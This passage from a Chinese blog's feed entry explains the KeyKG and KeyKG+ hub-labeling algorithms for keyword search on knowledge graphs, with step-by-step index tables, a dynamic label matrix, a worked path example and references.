style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>E 未访问的邻居为 B，但由于 <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[E] + \text{wt}((E,B)) = 0.3 + 0.8 = 1.1 &gt; d[B] = 0.6\)</span>，所以不更新；又由于 B 在 PQ 中，所以不加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">C</th><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;"></td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 C，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[C] = 0.4 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,C) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 25%" /><col style="width: 7%" /><col style="width: 26%" /><col style="width: 7%" /><col style="width: 26%" /><col style="width: 7%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>C 未访问的邻居为 F，但由于 <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[C] + \text{wt}((C,F)) = 0.4 + 2 = 2.4 &lt; d[F] = \infty\)</span>，所以，更新 <span class="math inline">\(d[F]\)</span> ：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;">0.4</td><td style="text-align: center;">1</td><td style="text-align: center;">0.3</td><td style="text-align: center;"><strong>2.4</strong></td></tr></tbody></table><p>此时，属于 <span class="math inline">\(L_1(F)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 2.4, \textrm{pred}= C)\)</span></p><p>又由于 F 不在 PQ 中，所以加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;"></td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 B，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[B] = 0.6 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,B) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table style="width:100%;"><colgroup><col style="width: 21%" /><col style="width: 23%" /><col style="width: 22%" /><col style="width: 5%" /><col style="width: 22%" /><col style="width: 5%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>B 未访问的邻居为 F，但由于 <span class="math inline">\(d[u]+\text{wt}((u,w)) = d[B] + \text{wt}((B,F)) = 0.6 + 0.1 = 0.7 &lt; d[F] = 2.4\)</span>，所以，更新 <span class="math inline">\(d[F]\)</span> ：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;">0.4</td><td style="text-align: center;">1</td><td style="text-align: center;">0.3</td><td style="text-align: center;"><strong>0.7</strong></td></tr></tbody></table><p>此时，属于 <span class="math inline">\(L_1(F)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></p><p>又由于 F 在 PQ 中，所以不加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">D</th><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 D，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">1</td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[D] = 1 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,D) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 18%" /><col style="width: 20%" /><col style="width: 19%" /><col style="width: 18%" /><col style="width: 19%" /><col style="width: 5%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>D 没有未访问的邻居，故不更新 <span class="math inline">\(d[F]\)</span> ，也就没有顶点加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;">F</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头（队尾）</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>PQ 弹出 F，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;">1</td><td style="text-align: center;"><strong>1</strong></td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[F] = 0.7 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,F) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 16%" /><col style="width: 17%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math display">\[A(\textrm{dist} = 0.6, \textrm{pred}= A)\]</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></td></tr></tbody></table><p>F 没有未访问的邻居，故不更新 <span class="math inline">\(d[F]\)</span> ，也就没有顶点加入 PQ。</p><p>此时 PQ 为：</p><table><thead><tr class="header"><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"></td></tr></tbody></table><hr /><p>至此，第一次 for 迭代结束，索引结果为</p><table style="width:100%;"><colgroup><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.6, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0.7, \textrm{pred}= B)\)</span></td></tr></tbody></table><p>类似的处理，可得下图右下角的索引。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><h4 id="extension-of-index-structure">Extension of Index Structure</h4><p>为了支持计算 <code>getSP</code> ，我们需要扩展 <code>L</code> 的索引结构。在<strong>算法 2</strong> 中，对于每一个 hub <span class="math inline">\(v_i\in L(w)\)</span> ，我们不仅仅存储了 <span class="math inline">\(\textrm{dist}(w,v_i)\)</span> ，还存储了以 <span class="math inline">\(v_i\)</span> 为根节点搜索树中 <span class="math inline">\(w\)</span> 的前驱顶点，并将其记作 <span class="math inline">\(\textrm{pred}(w,v_i)\)</span> （Line 16）。</p><p>有了扩展后的索引结构，<code>getSP</code> 就可以通过<strong>算法 3</strong> 计算得到。为了得到顶点 <span class="math inline">\(u,\;v\)</span> 之间的一条最短路径 <span class="math inline">\(p\)</span> ，我们首先在 <span class="math inline">\(p\)</span> 上找到它们所共有的 hub <span class="math inline">\(h_{\textrm{min}}\)</span> （Line 1），然后重复地跟随前驱顶点，构造路径 <span class="math inline">\(p\)</span> 的从 <span class="math inline">\(u\)</span> 到 <span class="math inline">\(h_{\textrm{min}}\)</span> 的一段（Line 2-8），以及 <span class="math inline">\(v\)</span> 到 <span class="math inline">\(h_{\textrm{min}}\)</span> 的一段（Line 9-14）。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo3.PNG" alt="Algorithm 3" /><figcaption>Algorithm 3</figcaption></figure><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>举个例子，比如计算 <code>getSP(D, F)</code> 。</p><p>首先，<code>L(D)</code> 和 <code>L(F)</code> 的公共 hub 只有一个，就是 <span class="math inline">\(A\)</span>，则 <span class="math inline">\(h_{\textrm{min}} = A\)</span> 。</p><p>然后，通过 <code>pred</code> 信息找到 D-A 的路径，为 D-A ，因为 <code>L(D)</code> 中 <span class="math inline">\(A\)</span> 的 <code>pred</code> 为 <span class="math inline">\(A\)</span>。</p><p>接着，同样的，找到 F-A 的路径，为 F-B-A，因为 <code>L(F)</code> 中的 A 的 <code>pred</code> 为 <span class="math inline">\(B\)</span>，L(B) 中的 <span class="math inline">\(A\)</span> 的 <code>pred</code> 为 <span class="math inline">\(A\)</span>。</p><p>最后，将上面两个子路径连起来，我们就找到了路径 <span class="math inline">\(p\)</span>，为 D-A-B-F。</p><h2 id="keykg-with-dynamic-hl">KeyKG+ With Dynamic HL</h2><h3 id="dynamic-hl">Dynamic HL</h3><h4 id="features">Features</h4><ul><li><strong>查询相关的</strong>（<em>query-relevant</em>）</li><li><strong>在线构造的</strong>（<em>online constructed</em>）</li></ul><h4 id="definition-and-structure">Definition and structure</h4><p>一个动态 HL 是一个 <span class="math inline">\((g-1)\times n\)</span> 的矩阵，记作 <span class="math inline">\(M\)</span> 。行对应于关键词顶点集 <span class="math inline">\(K_2,K_3,\dots,K_g\)</span> ，列对应于 hub 顶点。<span class="math inline">\(M\)</span> 的第 <span class="math inline">\((i-1)\)</span> 行（记作 <span class="math inline">\(M_{i-1}\)</span>）倒排并且聚集了 <span class="math inline">\(K_i\)</span> 中顶点的静态索引标签。<span class="math inline">\(M_{i-1}\)</span> 的第 j 个元素（记作 <span class="math inline">\(M_{i-1,j}\)</span>）是非空的，如果 <span class="math inline">\(h_j\in V\)</span> 是一个 hub，并且它在 <span class="math inline">\(K_i\)</span> 的至少一个顶点的静态索引标签中。在 <span class="math inline">\(K_i\)</span> 中的这些顶点中（这些顶点的静态索引标签包括 <span class="math inline">\(h_j\)</span>），<span class="math inline">\(M_{i-1, j}\)</span> 代表了最小化到达 <span class="math inline">\(h_j\)</span> 的距离的顶点。如果， <span class="math inline">\(h_j\)</span> 不是一个在 <span class="math inline">\(K_i\)</span> 中任意一个顶点的索引标签中的 hub，那么我们令 <span class="math inline">\(M_{i-1, j}\)</span> 为 null： <span class="math display">\[M_{i-1,j}=\begin{cases}&amp;\underset{u\in K_i\; s.t.\; h_j\in L(u)}{\textrm{argmin}}\textrm{dist}(u, h_j)&amp;h_j\in \bigcup_{u\in K_i}L(u),\\&amp;null&amp;h_j\not\in \bigcup_{u\in K_i}L(u),\end{cases}\]</span> 具体的，论文中使用<strong>二维数组</strong>存储矩阵 <span class="math inline">\(M\)</span> ，因此可以支持常数时间的随机访问。对于每一个不为 null 的 <span class="math inline">\(M_{i-1, j}\)</span> ，与 <span class="math inline">\(h_j\)</span> 的距离也是先计算出来，并保存到 <span class="math inline">\(M\)</span> 中。</p><h4 id="example">Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><ul><li><span class="math inline">\(i = 2\)</span> 时，<span class="math inline">\(K_2=\{E\}\)</span> ，<span class="math inline">\(L(E) = \{A,B,E\}\)</span> ，因此矩阵 <span class="math inline">\(M\)</span> <span class="math inline">\(K_2\)</span> 行只有 <span class="math inline">\(A,B,E\)</span> 不为 null，其他都为 null；由于 <span class="math inline">\(K_2\)</span> 中只有一个元素 <span class="math inline">\(E\)</span> ，故 <span class="math inline">\(K_2\)</span> 行 <span class="math inline">\(A,B,E\)</span> 列中的元素都为 <span class="math inline">\(E\)</span> 和到它的距离（从 <span class="math inline">\(L(E)\)</span> 中直接取得）。</li><li><span class="math inline">\(i = 3\)</span> 时，<span class="math inline">\(K_3=\{C,D\}\)</span> ，<span class="math inline">\(L(C)\cup L(D) = \{A,C,D\}\)</span> ，因此矩阵 <span class="math inline">\(M\)</span> <span class="math inline">\(K_3\)</span> 行只有 <span class="math inline">\(A,C,D\)</span> 不为 null，其他都为 null；由于 <span class="math inline">\(K_3\)</span> 中有两个元素，故 <span class="math inline">\(K_3\)</span> 行 <span class="math inline">\(A,C,D\)</span> 列中的元素需要对比一下分别到 <span class="math inline">\(C\)</span> 和 <span class="math inline">\(D\)</span> 的距离，选择较小的存入矩阵 <span class="math inline">\(M\)</span> （比如 <span class="math inline">\(M_{K_3, A}\)</span> ，由于 <span class="math inline">\(\textrm{dist}(C,A) &lt; \textrm{dist}(D,A)\)</span>，所以将 <span class="math inline">\(C\)</span> 存入矩阵）。</li></ul><p>综上所示，矩阵 <span class="math inline">\(M\)</span> 如下图所示：</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/11/matrix-M.PNG" alt="Dynamic HL Example" /><figcaption>Dynamic HL Example</figcaption></figure><h3 id="algorithm-keykg-1">Algorithm KeyKG+</h3><h4 id="algorithm-explained-1">Algorithm Explained</h4><p>KeyKG+ 如<strong>算法 4</strong> 所示。这个算法主要构造了动态 HL，并将其使用在两个方面，提高执行的总体性能，并且对最终结果没有任何影响。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/11/Algo4.PNG" alt="Algorithm 4" /><figcaption>Algorithm 4</figcaption></figure><p>在第一部分，首先，为 <span class="math inline">\(K_2,\dots,K_g\)</span> 构造矩阵 <span class="math inline">\(M\)</span> （Line 1-3）。然后，按照如下流程利用 <span class="math inline">\(M_{i-1}\)</span> 找到 <span class="math inline">\(v_i\)</span> （Line 6）。对于每一个 hub <span class="math inline">\(h_j\in L(v_1)\)</span> ，我们从 <span class="math inline">\(L(v_1)\)</span> 中取得 <span class="math inline">\(\textrm{dist}(v_1,h_j)\)</span> ，并且从 <span class="math inline">\(M_{i-1}\)</span> 中取 <span class="math inline">\(M_{i-1, j}\)</span> 元素的 <span class="math inline">\(\textrm{dist}(M_{i-1,j},h_j)\)</span> 。如果 <span class="math inline">\(M_{i-1,j}\)</span> 非空，那么我们计算： <span class="math display">\[\textrm{dist}(v_1,h_j)+\textrm{dist}(M_{i-1,j},h_j)\]</span> 这个结果表示了 <span class="math inline">\(v_1\)</span> 到在 <span class="math inline">\(K_i\)</span> 中经过一个特定的 <span class="math inline">\(h_j\)</span> 所能到达的顶点之间的最短距离。最后， 通过如下方式，找到 <span class="math inline">\(v_i\)</span> ： <span class="math display">\[v_i=\underset{M_{i-1, j}\; s.t.\; h_j\in L(v_1)\; \textrm{and}\; M_{i-1, j}\ne \textrm{null}}{\textrm{argmin}} \textrm{dist}(v_1,h_j)+\textrm{dist}(M_{i-1,j},h_j)\]</span> KeyKG+ Line 6 计算得到的 <span class="math inline">\(v_i\)</span> 和 KeyKG Line 3 得到的 <span class="math inline">\(v_i\)</span> 等价，但是 KeyKG+ 的效率更高。</p><p>第二部分，我们像为 <span class="math inline">\(K_i\)</span> 创建 <span class="math inline">\(M_{i-1}\)</span> 一样，为 <span class="math inline">\(V_{T_u}\)</span> （Line 14）创建 <span class="math inline">\(M&#39;_{u}\)</span> 。随着 <span class="math inline">\(T_u\)</span> 在每次迭代中逐渐扩展（Line 21），<span class="math inline">\(M&#39;_{u}\)</span> 通过加入到 <span class="math inline">\(T_u\)</span> 的顶点的静态索引标签得到更新（Line 22）。对于每一个 <span class="math inline">\(t_i\in(U_x\backslash V_{T_u})\)</span> ，<span class="math inline">\(M&#39;_u\)</span> 被用来找到与 <span class="math inline">\(t_i\)</span> 距离最短的顶点 <span class="math inline">\(s_i\in V_{T_u}\)</span> （Line 16-18）。我们在所有的这样的 <span class="math inline">\(&lt;s_i,t_i&gt;\)</span> 中找到最小的 <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> （Line 19）</p><p>KeyKG+ Line 16-19 计算得到的 <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> 和 KeyKG Line 12 得到的 <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> 等价，但是 KeyKG+ 的效率更高。</p><h4 id="running-example-1">Running Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>如上图，</p><ul><li>令 <span class="math inline">\(B\in K_1\)</span> 为 <span class="math inline">\(v_1\)</span> ，查询其 Static HL，得到 <span class="math inline">\(L(B) = \{A,B\}\)</span> ；<ul><li>因为 <span class="math inline">\(M_{1,A} = M_{1,B} = E\)</span> ，所以令 <span class="math inline">\(E\in K_2\)</span> 为 <span class="math inline">\(v_2\)</span> ；</li><li>因为 <span class="math inline">\(M_{2,A} = C, M_{2,B} = \textrm{null}\)</span> ，所以令 <span class="math inline">\(C\in K_3\)</span> 为 <span class="math inline">\(v_3\)</span> ；</li><li>这样就形成了 <span class="math inline">\(U_B=\{B,E,C\}\)</span> （这与算法 KeyKG 得到的结果是一致的）</li></ul></li><li>令 <span class="math inline">\(F\in K_1\)</span> 为 <span class="math inline">\(v_1\)</span> ，查询其 Static HL，得到 <span class="math inline">\(L(F) = \{A,B,F\}\)</span> ；<ul><li>因为 <span class="math inline">\(M_{1,A} = M_{1,B} = E, M_{1,F} = \textrm{null}\)</span> ，所以令 <span class="math inline">\(E\in K_2\)</span> 为 <span class="math inline">\(v_2\)</span> ；</li><li>因为 <span class="math inline">\(M_{2,A} = C, M_{2,B} = M_{2,F} = \textrm{null}\)</span> ，所以令 <span class="math inline">\(C\in K_3\)</span> 为 <span class="math inline">\(v_3\)</span> ；</li><li>这样就形成了 <span class="math inline">\(U_F=\{F,E,C\}\)</span> （这与算法 KeyKG 得到的结果是一致的）</li></ul></li></ul><div class="note default"><p><strong>TODO</strong>：另一半的例子怎么解释？？？</p></div><h1 id="how-much">How much？</h1><ul><li>基于 <em>betweenness centrality</em> 的启发式方法构建的 <em>Static Hub Labelings</em> 超越了现存的方案。</li><li><em>Dynamic Hub Labelings</em> 则通过倒排并聚集查询相关的静态标签，加速了总体的查询效率。</li></ul><h1 id="what-then">What Then？</h1><ul><li>寻找支持更高效地边删除（<em>edge deletion</em>）的解决方案</li><li>KeyKG+ 的近似比率可以进一步得到提高</li><li>现存 HL 方案无法处理巨大而稠密的图。</li></ul><h1 id="problems-to-solve">Problems to Solve</h1><ul><li><input type="checkbox" disabled="" />Hub Labeling<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></li><li><input type="checkbox" disabled="" />pruned landmark labeling <a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></li><li><input type="checkbox" disabled="" />PLL<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></li><li><input type="checkbox" disabled="" />between centrality？？？【10】 <a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> vs 【4】<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a></li></ul><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p>Ittai Abraham, Daniel Delling, Andrew V. Goldberg, and Renato Fonseca F. Werneck. 2011. A Hub-Based Labeling Algorithm for Shortest Paths in Road Networks. In SEA. 230–241.<a href="#fnref1" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn2" role="doc-endnote"><p>Takuya Akiba, Yoichi Iwata, and Yuichi Yoshida. 2013. Fast exact shortest-path distance queries on large networks by pruned landmark labeling. In SIGMOD. 349–360<a href="#fnref2" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn3" role="doc-endnote"><p>Takuya Akiba, Yoichi Iwata, and Yuichi Yoshida. 2013. Fast exact shortest-path distance queries on large networks by pruned landmark labeling. In SIGMOD. 349–360<a href="#fnref3" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn4" role="doc-endnote"><p>Ulrik Brandes. 2001. A faster algorithm for betweenness centrality. J. Math. Soc. 25, 2 (2001), 163–177.<a href="#fnref4" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn5" role="doc-endnote"><p>Ziyad AlGhamdi, Fuad Jamour, Spiros Skiadopoulos, and Panos Kalnis. 2017. A Benchmark for Betweenness Centrality Approximation Algorithms on Large Graphs. In SSDBM<a href="#fnref5" class="footnote-back" role="doc-backlink">↩</a></p></li></ol></section>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/</id>
        <title><![CDATA[PAC 模型及其变体]]></title>
        <updated>2020-12-13T06:40:34+08:00</updated>
